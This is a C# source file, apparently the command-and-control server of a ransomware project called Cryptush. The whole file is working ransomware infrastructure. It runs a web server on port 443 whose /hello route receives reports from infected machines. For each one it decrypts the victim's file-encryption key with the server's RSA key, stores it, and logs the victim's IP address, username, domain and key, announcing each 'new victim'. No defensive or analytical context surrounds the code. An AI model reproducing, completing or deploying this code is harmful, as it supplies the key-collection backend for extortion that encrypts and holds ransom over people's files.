using System;
using System.Threading.Tasks;
using WatsonWebserver;
using System.Security.Cryptography;
using Server.lib;
using Cryptush.lib;

namespace Server
{
    class RansomServer
    {
        public static RSACryptoServiceProvider rsa = ServerRSAHandler.Create();
        static void Main(string[] args)
        {
            int ServerPort = 443;
            WatsonWebserver.Server s = new("*", ServerPort, false, DefaultRoute);
            s.Start();
            Logger.WriteLog("Info", $"Server started on port {ServerPort}");
            CLI.Start();
        }

        [StaticRoute(HttpMethod.POST, "/hello")]
        public static async Task GetHelloRoute(HttpContext ctx)
        {
            ctx.Response.StatusCode = 200;
            var newAgent = ctx.Request.DataAsJsonObject<Agent>();
            newAgent.guid = Guid.NewGuid();
            newAgent.Key = ServerRSAHandler.RSADecrypt(rsa, newAgent.Key);
            Db.victims.Add(newAgent);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"\n>>> A new victim has been encrypted! [IP - {ctx.Request.Source.IpAddress}] [User - {newAgent.Username}@{newAgent.Domain}]");
            Console.WriteLine($">>> [Token - {newAgent.guid}] - [Key - {newAgent.Key}]\n");
            Console.ForegroundColor = ConsoleColor.Gray;

            Logger.WriteLog("Info", $"A new victim has been encrypted! [IP - {ctx.Request.Source.IpAddress}] [User - {newAgent.Username}@{newAgent.Domain}]");
            Logger.WriteLog("Info", $"[Token - {newAgent.guid}] - [Key - {newAgent.Key}]");

            await ctx.Response.Send(newAgent.guid.ToString());
        }

        static async Task DefaultRoute(HttpContext ctx)
        {
            ctx.Response.StatusCode = 200;
            await ctx.Response.Send("Hello from the other side");
        }
    }
}
